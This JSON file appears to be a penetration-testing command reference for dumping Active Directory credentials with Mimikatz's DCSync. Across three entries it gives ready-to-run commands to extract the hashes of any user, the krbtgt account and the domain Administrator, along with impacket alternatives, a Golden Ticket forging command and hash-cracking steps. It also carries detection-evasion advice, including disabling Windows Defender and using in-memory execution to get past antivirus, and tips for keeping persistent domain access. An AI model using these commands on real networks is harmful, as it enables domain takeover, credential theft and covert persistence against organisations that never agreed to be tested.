{
  "metadata": {
    "file_purpose": "Active Directory DCSync with Mimikatz - Windows-based credential extraction using Directory Replication Service protocol",
    "educational_context": "Mimikatz's lsadump::dcsync module uses the IDL_DRSGetNCChanges API to request credential updates from a domain controller. The DC doesn't verify the request originated from another DC - it only checks that the requesting SID has replication privileges. This makes DCSync powerful but requires Domain Admin or explicit replication rights.",
    "prerequisites": [
      "Domain Admin, Enterprise Admin, or Administrators group membership",
      "OR explicit replication rights (DS-Replication-Get-Changes-All)",
      "Network connectivity to Domain Controller (RPC ports 135, 445, dynamic high ports)",
      "Mimikatz binary (mimikatz.exe) on compromised Windows system"
    ],
    "related_techniques": [
      "Golden Ticket (ad-golden-ticket.json)",
      "LSA Secrets Dump (ad-lsa-dump.json)",
      "NTDS.dit Extraction (ad-ntds-extraction.json)",
      "Pass the Hash (ad-pass-the-hash.json)",
      "Impacket secretsdump (ad-dcsync-secretsdump-user.json)"
    ],
    "attack_chain": [
      "1. Verify Domain Admin rights (net group \"Domain Admins\" /domain)",
      "2. Launch Mimikatz on compromised Windows machine",
      "3. DCSync target user (dave, Administrator, krbtgt)",
      "4. Extract NTLM hash from output",
      "5. Use hash for Pass-the-Hash OR crack with Hashcat",
      "6. If krbtgt: Create Golden Ticket for persistence"
    ],
    "detection_evasion": [
      "DCSync generates Event ID 4662 on Domain Controller (directory service access)",
      "Target specific users (--user) instead of dumping all (less noisy)",
      "Perform during business hours when legitimate replication occurs",
      "Use service account credentials for attack (blends with normal automation)",
      "Consider Linux alternative (impacket-secretsdump) to avoid AV/EDR on Windows"
    ]
  },
  "commands": [
    {
      "id": "ad-dcsync-mimikatz-user",
      "name": "DCSync Specific User with Mimikatz",
      "category": "post-exploit",
      "subcategory": "active-directory",
      "command": "mimikatz # lsadump::dcsync /user:<DOMAIN>\\<USERNAME>",
      "description": "Extract password hash of a specific domain user by impersonating a domain controller. Uses Directory Replication Service (DRS) protocol to request credentials remotely. PRIMARY method for obtaining krbtgt hash for Golden Ticket attacks.",
      "variables": [
        {
          "name": "<DOMAIN>",
          "description": "NetBIOS domain name or FQDN (e.g., corp or corp.com). Use FQDN for multi-domain forests.",
          "example": "corp",
          "required": true
        },
        {
          "name": "<USERNAME>",
          "description": "Target domain user account to extract credentials from. Common high-value targets: krbtgt (Golden Ticket), Administrator (domain admin), service accounts (SPNs).",
          "example": "dave",
          "required": true
        }
      ],
      "flag_explanations": {
        "lsadump::dcsync": "Mimikatz module that performs DC synchronization attack. Simulates the behavior of a domain controller requesting password data via Directory Replication Service Remote Protocol (MS-DRSR). This is NOT memory dumping - it's a network-based attack using legitimate AD replication APIs. CRITICAL: Requires Domain Admin or replication rights (DS-Replication-Get-Changes, DS-Replication-Get-Changes-All).",
        "/user:<DOMAIN>\\<USERNAME>": "Specifies the target account to replicate. Format must include domain prefix (DOMAIN\\user or DOMAIN.COM\\user). The backslash must be escaped in some contexts (double backslash in scripts). Common targets: krbtgt (RID 502), Administrator (RID 500), service accounts (SPN-based accounts like sqlsvc, backup-svc). WHY specific user: Reduces noise and log volume compared to dumping all hashes.",
        "Optional: /domain:<DOMAIN_FQDN>": "Explicitly specify target domain FQDN. Usually auto-detected from /user parameter, but useful in multi-domain forests or when current domain context is ambiguous. Example: /domain:corp.com",
        "Optional: /dc:<DC_FQDN>": "Target specific domain controller. Auto-detected by default (uses closest DC), but useful for targeting specific DCs or troubleshooting replication issues. Example: /dc:DC1.corp.com"
      },
      "success_indicators": [
        "Output: '[DC] <DOMAIN>.com will be the domain'",
        "Output: '[DC] <DC_FQDN> will be the DC server'",
        "Output: '[DC] <DOMAIN>\\<USERNAME> will be the user account'",
        "Output: 'Object RDN : <username>'",
        "Output: 'SAM Username : <username>'",
        "Output: 'Hash NTLM: [32-character hex hash]'",
        "Output may include: 'ntlm-0:', 'ntlm-1:' (password history)",
        "Output may include: 'aes256-cts-hmac-sha1-96:' (Kerberos AES keys)"
      ],
      "failure_indicators": [
        "ERROR kuhl_m_lsadump_dcsync ; GetNCChanges: 0x00002105 (8453)",
        "ERROR: The attempted operation did not complete",
        "Access is denied",
        "The RPC server is unavailable",
        "The user name or password is incorrect",
        "ERROR: Object not found"
      ],
      "troubleshooting": {
        "ERROR 0x00002105 (Access Denied)": "Current user lacks replication privileges. Solution: Verify Domain Admin membership: net group \"Domain Admins\" /domain. Check current user: whoami /groups | findstr \"Domain Admins\". If not DA, verify explicit replication rights: Get-Acl 'AD:\\DC=corp,DC=com' (requires PowerShell RSAT). DCSync requires BOTH DS-Replication-Get-Changes AND DS-Replication-Get-Changes-All.",
        "RPC server unavailable": "Cannot contact Domain Controller. Solution: Verify DC connectivity: nltest /dsgetdc:<DOMAIN>. Test RPC: portqry -n <DC_IP> -p tcp -e 135,445. Check firewall rules: Test-NetConnection <DC_FQDN> -Port 135. Verify DNS resolution: nslookup <DC_FQDN>. If DC is down, target alternative DC with /dc: flag.",
        "User name or password is incorrect": "Session not authenticated to domain OR wrong domain. Solution: Verify domain authentication: echo %USERDOMAIN% (should show domain, not computer name). Re-authenticate: runas /netonly /user:<DOMAIN>\\<DA_USER> cmd.exe, then launch Mimikatz. If using Pass-the-Hash session, verify token with: whoami /groups.",
        "Object not found": "Username doesn't exist or typo. Solution: Verify account exists: net user <USERNAME> /domain. Check for typos in domain name: net group \"Domain Users\" /domain. Query all users: net user /domain. Common mistake: Using display name instead of SAM account name (use samaccountname, not cn).",
        "Mimikatz is not recognized": "Mimikatz not in PATH or current directory. Solution: Navigate to Mimikatz directory: cd C:\\Tools. Or use full path: C:\\Tools\\mimikatz.exe. Verify file exists: dir mimikatz.exe. If blocked by AV, disable Windows Defender: Set-MpPreference -DisableRealtimeMonitoring $true (requires admin).",
        "Antivirus blocks Mimikatz": "AV/EDR detecting Mimikatz signature. Solution: Use obfuscation: Invoke-ReflectivePEInjection, or use alternative tool: Impacket secretsdump (Linux-based, no AV on attacker machine). Consider Cobalt Strike's execute-assembly for in-memory execution. pentest TIP: Disable AV if you have admin rights: Set-MpPreference -DisableRealtimeMonitoring $true"
      },
      "prerequisites": [
        "ad-dcsync-check-domain-admins",
        "ad-dcsync-check-user-groups"
      ],
      "next_steps": [
        "windows-hashcat-crack-ntlm",
        "ad-pass-the-hash-crackmapexec",
        "ad-golden-ticket-dcsync-krbtgt"
      ],
      "alternatives": [
        "ad-dcsync-secretsdump-user"
      ],
      "tags": [
        "ACTIVE_DIRECTORY",
        "DCSYNC",
        "CREDENTIAL_DUMPING",
        "MIMIKATZ",
        "POST_EXPLOITATION",
        "WINDOWS"
      ],
      "notes": "DCSync is PREFERRED over LSA dumping because it's remote (no code execution on DC needed) and uses legitimate AD replication protocols. CRITICAL for certification: Always DCSync krbtgt FIRST to enable Golden Ticket attacks. The krbtgt hash rarely changes (only during domain functional level upgrades), providing persistent domain access. Example output parsing: Look for 'Hash NTLM:' line, copy the 32-character hex hash. Save to file for Hashcat cracking: echo [hash] > hashes.txt. Time estimate: 10-30 seconds for single user extraction.\n\nMANUAL ALTERNATIVES:\nSpecify domain controller explicitly:\nmimikatz # lsadump::dcsync /user:corp\\krbtgt /domain:corp.com /dc:DC1.corp.com\n\nDump with password history:\nmimikatz # lsadump::dcsync /user:corp\\Administrator /history\n\nPowerShell alternative (requires Invoke-Mimikatz):\nInvoke-Mimikatz -Command '\"lsadump::dcsync /user:corp\\krbtgt\"'\n\nImpacket (Linux - RECOMMENDED for certification):\nimpacket-secretsdump -just-dc-user krbtgt 'corp.com/jeffadmin:\"BrouhahaTungPerorateBroom2023!\"@192.168.50.70'\n\nHash extraction:\nmimikatz # lsadump::dcsync /user:corp\\dave | findstr \"NTLM\"\n\nTIME ESTIMATE: 10-30 seconds (single user extraction)",
      "filled_example": "mimikatz # lsadump::dcsync /user:corp\\dave"
    },
    {
      "id": "ad-dcsync-mimikatz-krbtgt",
      "name": "DCSync krbtgt for Golden Ticket",
      "category": "post-exploit",
      "subcategory": "active-directory",
      "command": "mimikatz # lsadump::dcsync /user:<DOMAIN>\\krbtgt",
      "description": "Extract the krbtgt account hash - THE most critical credential in Active Directory. Used for creating Golden Tickets that grant domain-wide administrative access. krbtgt password rarely changes, providing long-term persistence.",
      "variables": [
        {
          "name": "<DOMAIN>",
          "description": "NetBIOS domain name or FQDN",
          "example": "corp",
          "required": true
        }
      ],
      "flag_explanations": {
        "lsadump::dcsync": "Same DCSync module as user extraction. The krbtgt account (RID 502) is special - it's a service account used by the Key Distribution Center (KDC) to encrypt and sign all Kerberos Ticket Granting Tickets (TGTs). Possessing this hash allows forging TGTs that the domain will trust indefinitely.",
        "/user:krbtgt": "The Kerberos Ticket Granting Ticket account. This is a DISABLED built-in account (cannot be used for authentication directly). Its ONLY purpose is password hash storage for TGT encryption. CRITICAL: The krbtgt password is randomly generated at domain creation and ONLY changes during domain functional level upgrades (Server 2003 -> 2008+). In mature environments, this hash may be 10+ years old, providing extremely stable persistence.",
        "Why krbtgt is critical": "With krbtgt hash, you can create Golden Tickets (forged TGTs) that grant Domain Admin rights to ANY user. These tickets are valid until krbtgt password changes (rare). The DC cannot revoke Golden Tickets because they're cryptographically valid. This is the ULTIMATE persistence mechanism in Active Directory."
      },
      "success_indicators": [
        "Output: 'SAM Username : krbtgt'",
        "Output: 'Object RDN : krbtgt'",
        "Output: 'RID  : 000001f6 (502)' - krbtgt always has RID 502",
        "Output: 'User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )'",
        "Output: 'Hash NTLM: [32-character hex]' - THIS IS THE PRIZE",
        "Optional: 'aes256-cts-hmac-sha1-96: [64-character hex]' - For AES Golden Tickets"
      ],
      "failure_indicators": [
        "ERROR 0x00002105 (Access Denied)",
        "RPC server unavailable",
        "Object not found"
      ],
      "troubleshooting": {
        "Same as ad-dcsync-mimikatz-user": "See troubleshooting for ad-dcsync-mimikatz-user. krbtgt extraction has identical requirements and failure modes.",
        "Account is disabled warning": "EXPECTED behavior. krbtgt is always disabled - it's not a login account. The hash is still valid for Golden Ticket creation. Ignore this warning."
      },
      "prerequisites": [
        "ad-dcsync-check-domain-admins"
      ],
      "next_steps": [
        "ad-sid-whoami-extract",
        "ad-golden-ticket-purge-tickets",
        "ad-golden-ticket-mimikatz-create"
      ],
      "alternatives": [
        "ad-dcsync-secretsdump-user"
      ],
      "tags": [
        "ACTIVE_DIRECTORY",
        "DCSYNC",
        "CREDENTIAL_DUMPING",
        "MIMIKATZ",
        "GOLDEN_TICKET",
        "PERSISTENCE",
        "WINDOWS"
      ],
      "notes": "ALWAYS extract krbtgt when you achieve Domain Admin access. This is your insurance policy - even if defenders change all passwords, the krbtgt hash remains valid (they rarely rotate it). certification EXAM TIP: After getting DA, immediately DCSync krbtgt and save the hash externally. If you lose access or session dies, you can create Golden Ticket for re-entry. The krbtgt account has TWO password hashes stored (current and previous) - use the 'Hash NTLM:' line (current hash). Time estimate: 10-30 seconds.\n\nMANUAL ALTERNATIVES:\nWith explicit domain:\nmimikatz # lsadump::dcsync /user:corp.com\\krbtgt /domain:corp.com\n\nExtract both NTLM and AES keys:\nmimikatz # lsadump::dcsync /user:corp\\krbtgt /csv\n\nImpacket (Linux - RECOMMENDED):\nimpacket-secretsdump -just-dc-user krbtgt 'corp.com/admin:pass@192.168.50.70'\n\nPowerShell:\nInvoke-Mimikatz -Command '\"lsadump::dcsync /user:corp\\krbtgt\"' | Out-File krbtgt.txt\n\nParse hash only:\nmimikatz # lsadump::dcsync /user:corp\\krbtgt | findstr \"Hash NTLM\" | Select-String -Pattern \"[a-f0-9]{32}\"\n\nTIME ESTIMATE: 10-30 seconds\n\nNEXT STEP: Save this hash immediately! You need it + Domain SID + Domain FQDN for Golden Ticket:\n1. Copy NTLM hash: [32 hex chars]\n2. Get Domain SID: whoami /user (remove user RID)\n3. Get Domain FQDN: echo %USERDNSDOMAIN%\n4. Create Golden Ticket: kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-XXX /krbtgt:[HASH] /ptt",
      "filled_example": "mimikatz # lsadump::dcsync /user:corp\\krbtgt"
    },
    {
      "id": "ad-dcsync-mimikatz-administrator",
      "name": "DCSync Administrator Account",
      "category": "post-exploit",
      "subcategory": "active-directory",
      "command": "mimikatz # lsadump::dcsync /user:<DOMAIN>\\Administrator",
      "description": "Extract the domain Administrator account hash (RID 500). High-value target for lateral movement and privilege escalation. Often has simple passwords in legacy environments.",
      "variables": [
        {
          "name": "<DOMAIN>",
          "description": "NetBIOS domain name or FQDN",
          "example": "corp",
          "required": true
        }
      ],
      "flag_explanations": {
        "lsadump::dcsync": "Same DCSync module. The built-in Administrator account (RID 500) is the default domain admin account created at domain setup. Unlike krbtgt (disabled service account), Administrator is an active user account that can be used for authentication.",
        "/user:Administrator": "The built-in domain administrator account (SID S-1-5-21-<domain>-500). CANNOT be deleted or removed from Administrators group. Often renamed for security (query with RID 500 instead), but still usable. WHY target this: (1) Often has weak/default password, (2) Cannot be locked out (useful for password spraying), (3) Maximum privileges for lateral movement."
      },
      "success_indicators": [
        "Output: 'SAM Username : Administrator'",
        "Output: 'RID  : 000001f4 (500)' - Administrator always RID 500",
        "Output: 'Hash NTLM: [32-character hex hash]'",
        "Output: 'User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )'",
        "Password may have history: 'ntlm- 1:', 'ntlm- 2:' (older password hashes)"
      ],
      "failure_indicators": [
        "ERROR 0x00002105 (Access Denied)",
        "Object not found"
      ],
      "troubleshooting": {
        "Object not found (Administrator renamed)": "The built-in Administrator account was renamed for security. Solution: Query by RID instead: Get-ADUser -Filter 'SID -like \"*-500\"'. Or enumerate: net user /domain | findstr /V \"$\" (users without $ are not computer accounts). Once found, DCSync with: lsadump::dcsync /user:corp\\<RENAMED_ADMIN>",
        "Access Denied": "See troubleshooting for ad-dcsync-mimikatz-user."
      },
      "prerequisites": [
        "ad-dcsync-check-domain-admins"
      ],
      "next_steps": [
        "windows-hashcat-crack-ntlm",
        "ad-pass-the-hash-crackmapexec"
      ],
      "alternatives": [
        "ad-dcsync-secretsdump-user",
        "ad-dcsync-mimikatz-user"
      ],
      "tags": [
        "ACTIVE_DIRECTORY",
        "DCSYNC",
        "CREDENTIAL_DUMPING",
        "MIMIKATZ",
        "LATERAL_MOVEMENT",
        "WINDOWS"
      ],
      "notes": "Administrator hash is useful for immediate lateral movement (Pass-the-Hash) or password cracking. Unlike krbtgt (service account), Administrator can authenticate directly via NTLM/Kerberos. certification TIP: If Administrator password is complex, use the hash directly with Pass-the-Hash (psexec.py, wmiexec.py, evil-winrm). Start Hashcat cracking in background while using PTH for time efficiency. The built-in Administrator account CANNOT be locked out, making it safe for password spraying if you don't have hash yet. Time estimate: 10-30 seconds.\n\nMANUAL ALTERNATIVES:\nDCSync with password history:\nmimikatz # lsadump::dcsync /user:corp\\Administrator /history\n\nFind renamed Administrator:\nGet-ADUser -Filter 'SID -like \"*-500\"' | Select Name, SamAccountName\n\nImpacket:\nimpacket-secretsdump -just-dc-user Administrator 'corp.com/admin:pass@192.168.50.70'\n\nDCSync if renamed (example: AdminDA):\nmimikatz # lsadump::dcsync /user:corp\\AdminDA\n\nExtract and crack immediately:\nmimikatz # lsadump::dcsync /user:corp\\Administrator | findstr \"Hash NTLM\" > admin_hash.txt\nhashcat -m 1000 admin_hash.txt rockyou.txt -r best64.rule\n\nTIME ESTIMATE: 10-30 seconds (extraction only), 1-60+ minutes (cracking, depends on password complexity)",
      "filled_example": "mimikatz # lsadump::dcsync /user:corp\\Administrator"
    }
  ]
}